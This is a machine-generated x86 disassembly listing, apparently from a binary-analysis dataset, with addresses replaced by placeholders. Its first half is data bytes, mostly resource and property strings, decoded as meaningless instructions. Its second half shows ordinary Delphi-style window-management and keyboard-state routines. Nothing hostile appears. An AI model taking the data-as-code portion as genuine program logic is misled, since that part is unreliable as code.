insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
outsd
add bh bh
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
mov [ eax + 0x610044 ] ch
call 0x254554ca
enter 0x46 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
pushfd
inc esp
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
add [ esi + edx * 4 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5865646f
dec ebx
inc esi
add [ eax ] ch
add al [ eax ]
[ ebx + edx * 4 + 0x46 ]
dec ecx
inc esi
add [ ecx ] ch
add al [ eax ]
dec [ eax + 0x54004693 ]
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
js r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
popad
outsb
mov ah 0x29
inc edx
add [ eax ] dh
add bh bh
hlt
xchg [ esi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
inc esi
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push esp
clc
inc esp
add [ eax + edi * 8 - 0x69abffbc ] al
inc esi
add [ eax ] al
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax ] al
sbb [ edx ] 0x0
jb r-xdata
test al 0x89
insb
add [ gs : edi + 0x16c0044 ] dh
add bh bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x1700ffff ] ah
bound eax [ ebp ]
xchg esp eax
outsb
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add al bl
mov [ esi ] eax
add [ edi + 0x46 ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
add [ eax - 0xe ] bl
inc esp
add [ eax + 0x4689 ] ch
imul esp [ edi + 0x68 ] 0x40103c74
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
dec esp
inc esi
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] eax
push cs
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
add [ eax + 0x430b001b ] al
insb
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ eax + 0x4518 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
xor [ ebp + eax * 2 ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
int3
jb r-xdata
jae r-xdata
sub [ edx ] eax
in al dx
add al [ eax ]
call [ eax ]
enter 0x46 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
outsb
je r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
popad
inc ebp
add [ eax + 0x4561 ] bh
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6b00ffff ] ah
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
dec ecx
imul ebp [ ebp - 0x44 ] 0x8004645
add al [ eax ]
call [ eax + 0x76 ]
inc esi
add [ esi + edx * 4 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
cmp al 0x10
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
outsd
outsb
jae r-xdata
xor [ ecx + 0x740044 ] ch
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x40109474
inc edx
add [ eax ] ch
add bh bh
dec eax
stc
inc esp
add [ eax - 0x7 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
out 0x45 eax
add [ eax + 0x2 ] cl
add bh bh
int3
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
inc edx
add [ eax + 0x2 ] al
add bh bh
dec eax
xchg esi eax
inc esi
inc eax
add [ ecx ] bl
add bh bh
cmp cl 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
insb
add [ fs : eax ] dl
dec edx
inc esi
add [ edi ] ch
add al [ eax ]
inc [ esi + edx * 4 - 0x69abffba ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
outsb
pushad
dec esp
inc esi
outsb
arpl [ eax - 0x68 ] bp
0x7c0045 0xff00
add [ eax ] al
dec edi
jb r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
add [ 0x7a726f48 ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
add [ esi + edx * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
inc eax
add [ eax + eax ] cl
push [ eax + esi * 8 ]
inc esp
add [ eax ] dl
xchg [ esi ] eax
add [ eax ] al
insb
cmp al 0x10
inc eax
add [ edx + ebx * 4 ] al
inc esi
add [ eax ] dl
0x96540046 0x46
add [ eax ] al
add [ eax + 0x1 ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
mov al [ 0xffffffffb4004699 ]
cdq
inc esi
loop r-xdata
loop r-xdata
dec ebx
inc esi
add [ eax ] dh
add al [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax + 0x2 ] ah
add bh bh
adc [ edi - 0x69abffba ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ss : edx ] cl
push ebx
arpl [ edx + 0x65 ] si
add bh bh
sub_465965
inc esp
add [ eax ] dl
xchg [ esi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add eax 0x74646957
push r-xdata
sub eax [ edx ]
add bh bh
add [ ebx - 0x69abffba ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
push esp
xchg esi eax
inc esi
jb r-xdata
push ecx
cmp [ ebx + 0x41 ] bl
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
in al 0xe2
inc ebp
add [ eax + 0x2 ] bl
add bh bh
movsb [ edi ] [ esi ]
xchg edi eax
inc esi
add [ esi + edx * 4 + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
cmp [ gs : ebx + 0x41 ] bl
mov [ edi + 0xc80044 ] ch
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x4f0b003d ] al
add [ eax ] al
pop ebx
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec edi
fsubr [ esp + eax * 2 + 0x1b000 ]
push [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
cmp [ ebx + 0x41 ] bl
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
push esp
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb [ edi + 0xc00044 ] ch
add bh bh
rol [ eax ] 0x0
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
jb r-xdata
fsubr [ ebx + 0xe80044 ]
add bh bh
call 0x55455bbd
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
jb r-xdata
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
xor al 0x4d
inc esi
add [ eax - 0x6700fffe ] bl
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
push esp
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x386f666e
pop ebx
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
cmp [ ebx + 0x41 ] bl
jo r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] al
add [ edi ] 0xa
lodsb [ esi ]
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
lodsd [ esi ]
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ 0x65476e4f ] cl
je r-xdata
stosd [ edi ]
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x74 ] bp
scasb [ edi ]
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
dec edi
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
pop ebx
inc ecx
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
stosb [ edi ]
adc al 0xab
inc esp
add al ah
add [ eax ] eax
jmp eax
outsb
dec eax
imul esp [ ebp - 0x4c ] 0xa800464d
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
outsd
stosd [ edi ]
inc esp
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0x54ff0002 ]
xchg esi eax
inc esi
jo r-xdata
add bh bh
push esp
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070051 ] al
test eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
push esp
xchg esi eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
add [ esi ] al
dec edi
add [ eax + 0x4f0a0044 ] al
pop ebx
inc ecx
add al dl
add al [ eax ]
call eax
outsd
jne r-xdata
push ebp
jo r-xdata
insb
mov al [ 0x400044b0 ]
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
inc esp
outsd
ja r-xdata
pop ebx
inc ecx
push edi
push 0x556c6565
jo r-xdata
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
mov al 0x44
add [ eax ] bh
add [ eax ] eax
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
inc esp
add al bl
add [ eax ] al
stosb [ edi ]
inc esi
add ah dh
xor al 0x40
add [ eax - 0x5d ] dh
inc esi
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + edi * 2 + 0x46 ] ch
jb r-xdata
sbb [ ecx ] 0x8
dec edi
outsb
push edx
pop ebx
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add [ edi ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
push edi
push 0xa06c6565
mov al 0x44
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
je r-xdata
jpe r-xdata
js r-xdata
mov al [ 0x480044b0 ]
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add ah bl
test [ esi ] al
lodsb [ esi ]
pop [ ecx ]
ror cl 0x1
inc esi
add [ eax - 0x7f ] ch
inc esi
add [ edx + eax * 4 + 0x46 ] dh
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
in al dx
mov al [ esi ]
fcom [ edi ]
inc edx
add [ esi + eax * 8 - 0x379bffba ] cl
inc esi
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
push 0x45
inc esp
hlt
outsd
arpl [ ebx - 0x2c ] bp
lodsd [ esi ]
inc esp
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol [ eax ] 0x5f
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x60 ] al
popad
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
inc esi
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add ah cl
xchg [ esi ] eax
xor al 0x5e
inc ebp
add al ah
0xeae40044 0x44
enter 0x46 0x80
inc bp
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
add [ edi + edi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
pop edi
inc esi
add [ eax ] ch
inc esi
add al bh
add al [ eax ]
add [ eax ] dl
dec esi
inc esi
add al ah
sbb al [ edx ]
push eax
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
pushad
add al cl
add al [ eax ]
dec eax
add al [ eax ]
call [ esi + edx * 4 + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xae40776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
cmp [ ebx + 0x41 ] bl
sub_4662b4
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_466300
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46fa1c
mov eax [ rw-data ]
call sub_421610
mov eax [ rw-data ]
call sub_4215b8
retn
push 0x0
push eax
call ShowOwnedPopups
sub_466338
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_466388
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_46642b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403778#6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_466338
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466432
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_46643c
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_40270c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_466474
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_4664d8
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_466474
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_466534
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_466554
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_466534
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_466580
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46cffc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_46d46c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407fcc
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46cfe8
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46d458
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407fcc
test eax eax
je r-xdata
sub_46661c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_466670
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4666ac
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4666f8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466756
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_464258
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404294
mov eax [ ebp - 0x8 ]
pop edx
call sub_407fcc
test eax eax
sete al
mov ebx eax
xor eax eax
